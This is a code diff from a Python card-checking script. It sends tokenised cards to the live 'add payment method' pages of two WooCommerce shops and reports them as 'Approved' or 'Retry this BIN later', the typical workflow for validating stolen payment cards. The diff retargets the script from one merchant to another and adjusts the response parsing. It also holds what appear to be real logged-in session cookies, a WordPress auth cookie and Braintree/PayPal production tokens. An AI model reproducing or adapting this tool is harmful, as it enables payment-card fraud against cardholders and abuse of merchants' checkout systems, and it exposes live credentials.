+    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; esale_number_dynamic_every_page=01348858199; _ga=GA1.1.1805518627.1726761586; aa_click=14098957664086814; __stripe_mid=511c1ddb-f227-4487-8668-852c8db824c4a765aa; __stripe_sid=b63c10a7-918c-4b85-aa1e-92fe60724759b594fa; wordpress_logged_in_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e; wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819=20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759; wfwaf-authcookie-69502fc676204955e38628a39ff999c4=20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60; _ga_E5SD97ZJ10=deleted; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_E5SD97ZJ10=GS1.1.1726761604.1.1.1726761726.0.0.0',
+    'origin': 'https://castlehottubs.co.uk',
+    'referer': 'https://castlehottubs.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_cc',
-    'braintree_cc_nonce_key': nonce,
-    'braintree_cc_device_data': '{"device_session_id":"e36d6eeea156c6963bc507e94e9c8757","fraud_merchant_id":null,"correlation_id":"2456c41dce56a08cf5bc1425a4924b3e"}',
-    'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/tqrv56bq2khzqk35/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/tqrv56bq2khzqk35"},"merchantId":"tqrv56bq2khzqk35","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"USD","merchantIdentifier":"tqrv56bq2khzqk35","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIxZWM5YTliMy0zOWZlLTQ5YzgtYmQxZS1lYmE2M2IyNWJhM2YiLCJpYXQiOjE3MTY2MzYyNDcsImV4cCI6MTcxNjY0MzQ0NywiaXNzIjoiNjU3YTRiZjEwYmJmYWI0NmQ3MjhjY2U5IiwiT3JnVW5pdElkIjoiNjU3YTRiZjEzYzJmNTE1ZTAyZWMxMjViIn0.f2jwnQCvHXIXi9roM3ePwvsT4J33zFoR3EnDfVogasQ"},"androidPay":{"displayName":"Husbands Paris","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTY3MjI2NDcsImp0aSI6IjI5MzRiNGZmLTM3YTUtNDg1OC04NjFjLTdhMDE1ZDEwNWRhZCIsInN1YiI6InRxcnY1NmJxMmtoenFrMzUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRxcnY1NmJxMmtoenFrMzUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.oDhOri6lzVmapobYDv3qTiyBnqd0B0n5IW2fn-_n7fo_BRiFf5B3tkR8RUyGzQGzVPUjQz3A548F3FNeV367vQ","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Husbands Paris","clientId":"AQ1508abMajQ4VRW2xqHw8nO0k4lTpyoOdC3blQptbuIpZXlzlgW4aR6lv3ClGVXN6lKeM0tKkd5_vT1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"husbandsparisUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
-    'woocommerce-add-payment-method-nonce': anonce,
-    '_wp_http_referer': '/en/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'visa'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce', tok),
+    ('wc_braintree_device_data', '{"correlation_id":"43f72992682d9d5ccefb0c9eb75f7dbb"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"43f72992682d9d5ccefb0c9eb75f7dbb"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'GBP'),
+    ('wc_braintree_paypal_locale', 'en_gb'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', add_nonce),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
-	response = requests.post(
-    'https://husbands-paris.com/en/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
+	response = requests.post('https://castlehottubs.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
 
-	pattern = r'Reason: (.*?)\s*</li>'
+
+
+	pattern = r'Status code (.*?)\s*</li>'
     
 	text = response.text
 	
 	match = re.search(pattern, text)
 	if match:
 		result = match.group(1)
-		if 'Duplicate' in result:
-		    result = "1000: Approved"
 		if 'risk_threshold' in text:
 		    result = "RISK: Retry this BIN later."
 	else:
-		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text or 'avs: Gateway Rejected: avs' in text:
 			result = "1000: Approved"
 		else:
 			result = "Error"
+		
 			
+	print(result)
 	return result
-	
 	
